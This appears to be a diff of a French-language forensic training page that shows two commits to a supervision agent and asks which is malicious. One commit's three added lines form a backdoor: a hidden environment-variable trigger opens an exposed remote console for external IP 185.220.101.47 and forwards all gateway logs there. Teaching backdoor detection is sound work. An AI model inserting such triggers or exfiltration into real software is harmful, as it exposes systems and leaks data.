@@ -551,6 +551,15 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .ghx-review-head{font-size:12px;color:#8b949e;margin-bottom:5px}
 .ghx-review-head b{color:#e6edf3}
 .ghx-review-text{font-size:13px;color:#e6edf3;line-height:1.55;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 12px}
+.ghx-crumb{font-size:13px;color:#8b949e;margin-bottom:12px}
+.ghx-crumb b{color:#e6edf3;font-weight:600}
+.ghx-section-label{font-size:12.5px;color:#8b949e;margin:2px 0 12px;line-height:1.5}
+.ghx-cx{border:1px solid #30363d;border-radius:6px;overflow:hidden;margin-bottom:18px;background:#0d1117}
+.ghx-cx-head{background:#161b22;border-bottom:1px solid #30363d;padding:12px 16px;display:flex;align-items:center;gap:10px}
+.ghx-cx-head .msg{flex:1;min-width:0}
+.ghx-cx-head .t{font-size:14px;color:#e6edf3;font-weight:600;line-height:1.35}
+.ghx-cx-head .m{font-size:12px;color:#8b949e;margin-top:4px;display:flex;align-items:center;gap:7px;flex-wrap:wrap}
+.ghx-cx-head .m b{color:#c9d1d9;font-weight:600}
 .enig-msg{background:var(--s2);border-left:2px solid #333;padding:10px 12px;border-radius:0 4px 4px 0;font-size:13px;color:var(--tx2);line-height:1.65}
 .enig-msg-label{font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.06em;margin-bottom:5px;text-transform:uppercase}
 .enig-ref{font-size:12.5px;color:#cccccc;font-weight:500;padding:9px 12px;background:#0f0f0f;border:1px solid var(--bd);border-radius:5px;line-height:1.6}
@@ -914,8 +923,10 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
               main
             </span>
 
+            <div class="ghx-crumb"><b>supervision-bx</b> / agent_superviseur.py</div>
+
             <div class="ghx-card">
-              <div class="ghx-card-head">Historique, agent_superviseur.py</div>
+              <div class="ghx-card-head">Commits</div>
 
               <div class="ghx-commit">
                 <div class="ghx-av" style="background:#1f6feb">JM</div>
@@ -938,6 +949,15 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
               <div class="ghx-commit">
                 <div class="ghx-av" style="background:#1f6feb">JM</div>
                 <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Console d'administration interne pour la supervision locale (serveur ELECARM 10.42.6.11)</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 6 mai 2026, TICK-4155</div>
+                </div>
+                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">c9a0f12</span></div>
+              </div>
+
+              <div class="ghx-commit">
+                <div class="ghx-av" style="background:#1f6feb">JM</div>
+                <div class="ghx-commit-body">
                   <div class="ghx-commit-msg">Correctif, le module de telemetrie journalisait deux fois la meme mesure</div>
                   <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 30 avril 2026, TICK-4139</div>
                 </div>
@@ -952,41 +972,68 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
                 </div>
                 <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">4a90de2</span></div>
               </div>
+            </div>
 
-              <div class="ghx-commit">
+            <div class="ghx-section-label">Deux commits ajoutent une console d'administration. Un seul est malveillant : comparez l'adresse IP et les conditions de deploiement.</div>
+
+            <div class="ghx-cx">
+              <div class="ghx-cx-head">
                 <div class="ghx-av" style="background:#1f6feb">JM</div>
-                <div class="ghx-commit-body">
-                  <div class="ghx-commit-msg">Augmentation du delai de retry TCP (3s vers 8s) suite aux instabilites reseau atelier</div>
-                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 15 avril 2026, TICK-4102</div>
+                <div class="msg">
+                  <div class="t">Console d'administration interne pour la supervision locale (serveur ELECARM 10.42.6.11)</div>
+                  <div class="m"><b>j.moreau</b> a valide le 6 mai 2026 <span class="ghx-verified">Verified</span> <span class="ghx-sha">c9a0f12</span></div>
                 </div>
-                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">c2e5170</span></div>
+              </div>
+              <div class="ghx-file-head">
+                <svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg>
+                <span class="path">agent_superviseur.py</span>
+                <span class="st"><span class="add">+2</span> -0</span>
+              </div>
+              <div class="ghx-diff">
+                <div class="ghx-row ghx-hunk"><span class="ghx-gut"></span><span class="ghx-gut"></span><span class="ghx-code"><span class="ghx-mark"> </span>@@ -10,5 +10,7 @@ def setup_admin_console():</span></div>
+                <div class="ghx-row"><span class="ghx-gut">10</span><span class="ghx-gut">10</span><span class="ghx-code"><span class="ghx-mark"> </span># agent_superviseur.py</span></div>
+                <div class="ghx-row"><span class="ghx-gut">11</span><span class="ghx-gut">11</span><span class="ghx-code"><span class="ghx-mark"> </span>    bind_local_services()</span></div>
+                <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">12</span><span class="ghx-code"><span class="ghx-mark">+</span>    # console d'administration interne, supervision ELECARM</span></div>
+                <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">13</span><span class="ghx-code"><span class="ghx-mark">+</span>    start_remote_console(bind='127.0.0.1', port=8443, allow_ip='10.42.6.11')</span></div>
+                <div class="ghx-row"><span class="ghx-gut">12</span><span class="ghx-gut">14</span><span class="ghx-code"><span class="ghx-mark"> </span>    enable_metrics_export()</span></div>
+              </div>
+              <div class="ghx-review">
+                <div class="ghx-av" style="background:#238636">OK</div>
+                <div class="ghx-review-body">
+                  <div class="ghx-review-head"><b>audit-dsi</b> a laisse un commentaire de revue</div>
+                  <div class="ghx-review-text">Changement LEGITIME. La console n'ecoute qu'en local (bind 127.0.0.1) et n'autorise que le serveur de supervision interne d'ELECARM (10.42.6.11), l'adresse avec laquelle la passerelle travaille normalement. Le commit est associe au ticket TICK-4155 et a ete relu avant deploiement. C'est une fausse piste : ne pas confondre avec le commit e7d0b4a du 9 mai.</div>
+                </div>
               </div>
             </div>
 
-            <div class="ghx-diffsum">Commit <b>e7d0b4a</b>, 1 fichier modifie avec <span class="add">3 ajouts</span> et 0 suppression.</div>
-
-            <div class="ghx-file">
+            <div class="ghx-cx">
+              <div class="ghx-cx-head">
+                <div class="ghx-av" style="background:#8b1a1a">JM</div>
+                <div class="msg">
+                  <div class="t">Ajout d'une condition ouvrant une console d'administration distante et la remontee de l'ensemble des flux de la passerelle</div>
+                  <div class="m"><b>j.moreau</b> depuis WS-MOREAU-01 (session RDP) le 9 mai 2026 <span class="ghx-unverified">Unverified</span> <span class="ghx-sha">e7d0b4a</span></div>
+                </div>
+              </div>
               <div class="ghx-file-head">
                 <svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg>
                 <span class="path">agent_superviseur.py</span>
                 <span class="st"><span class="add">+3</span> -0</span>
               </div>
               <div class="ghx-diff">
-                <div class="ghx-row ghx-hunk"><span class="ghx-gut"></span><span class="ghx-gut"></span><span class="ghx-code"><span class="ghx-mark"> </span>@@ -40,7 +40,10 @@ def start_supervision(cfg):</span></div>
-                <div class="ghx-row"><span class="ghx-gut">40</span><span class="ghx-gut">40</span><span class="ghx-code"><span class="ghx-mark"> </span>    channel = open_gateway_channel(cfg.host)</span></div>
-                <div class="ghx-row"><span class="ghx-gut">41</span><span class="ghx-gut">41</span><span class="ghx-code"><span class="ghx-mark"> </span>    push_metrics(channel, cfg.internal_server)</span></div>
-                <div class="ghx-row"><span class="ghx-gut">42</span><span class="ghx-gut">42</span><span class="ghx-code"><span class="ghx-mark"> </span></span></div>
+                <div class="ghx-row ghx-hunk"><span class="ghx-gut"></span><span class="ghx-gut"></span><span class="ghx-code"><span class="ghx-mark"> </span>@@ -40,6 +40,9 @@ def start_supervision(cfg):</span></div>
+                <div class="ghx-row"><span class="ghx-gut">40</span><span class="ghx-gut">40</span><span class="ghx-code"><span class="ghx-mark"> </span># agent_superviseur.py</span></div>
+                <div class="ghx-row"><span class="ghx-gut">41</span><span class="ghx-gut">41</span><span class="ghx-code"><span class="ghx-mark"> </span>    channel = open_gateway_channel(cfg.host)</span></div>
+                <div class="ghx-row"><span class="ghx-gut">42</span><span class="ghx-gut">42</span><span class="ghx-code"><span class="ghx-mark"> </span>    push_metrics(channel, cfg.internal_server)</span></div>
                 <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">43</span><span class="ghx-code"><span class="ghx-mark">+</span>    if os.environ.get('THALES_TEST_MODE') == '1':</span></div>
                 <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">44</span><span class="ghx-code"><span class="ghx-mark">+</span>        start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span></div>
                 <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">45</span><span class="ghx-code"><span class="ghx-mark">+</span>        forward_all_traffic_logs(to='185.220.101.47')</span></div>
-                <div class="ghx-row"><span class="ghx-gut">43</span><span class="ghx-gut">46</span><span class="ghx-code"><span class="ghx-mark"> </span></span></div>
-                <div class="ghx-row"><span class="ghx-gut">44</span><span class="ghx-gut">47</span><span class="ghx-code"><span class="ghx-mark"> </span>    run_forever(channel)</span></div>
+                <div class="ghx-row"><span class="ghx-gut">43</span><span class="ghx-gut">46</span><span class="ghx-code"><span class="ghx-mark"> </span>    run_forever(channel)</span></div>
               </div>
               <div class="ghx-review">
                 <div class="ghx-av" style="background:#6e40c9">AD</div>
                 <div class="ghx-review-body">
                   <div class="ghx-review-head"><b>audit-dsi</b> a laisse un commentaire de revue</div>
-                  <div class="ghx-review-text">Ces 3 lignes ajoutees ouvrent une console d'administration distante sur le port 443 et renvoient l'ensemble des journaux de la passerelle vers l'adresse 185.220.101.47 (voir Journaux / Logs). La variable THALES_TEST_MODE n'existe dans aucune configuration officielle : ce code n'a aucune raison d'etre. Il a ete pousse sans ticket ni revue, pendant la session RDP non autorisee du 08/05 23h44.</div>
+                  <div class="ghx-review-text">Changement MALVEILLANT. Contrairement au commit c9a0f12, la console ecoute sur toutes les interfaces (bind 0.0.0.0, donc exposee) et autorise une adresse EXTERNE, 185.220.101.47, qui n'appartient a aucun equipement ELECARM (voir Journaux / Logs). La variable THALES_TEST_MODE n'existe dans aucune configuration officielle. Le code renvoie en plus l'ensemble des journaux de la passerelle vers cette meme adresse. Pousse sans ticket ni revue, pendant la session RDP non autorisee du 08/05 23h44.</div>
                 </div>
               </div>
             </div>
